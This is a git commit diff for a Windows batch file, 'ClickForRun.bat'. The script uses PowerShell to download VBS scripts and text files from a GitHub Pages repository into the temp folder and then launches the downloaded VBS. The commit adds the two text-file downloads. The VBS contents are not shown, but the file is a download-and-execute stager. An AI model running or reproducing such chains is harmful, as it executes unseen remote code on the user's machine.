cfc67d9a6eac6821a6589cd48451af508f559499
Arista666 <86161915+Arista666@users.noreply.github.com>
2023-03-21 17:31:15 +0800

    Update ClickForRun.bat

--- Downlaod/VBSBAT/ClickForRun.bat
+++ Downlaod/VBSBAT/ClickForRun.bat
@@ -1,3 +1,5 @@
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/ClickForRun.vbs' -OutFile $env:temp\ClickForRun.vbs"
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/text.vbs' -OutFile $env:temp\text.vbs"
+powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/1.txt' -OutFile $env:temp\1.txt"
+powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/2.txt' -OutFile $env:temp\2.txt"
 start "" %temp%\ClickForRun.vbs
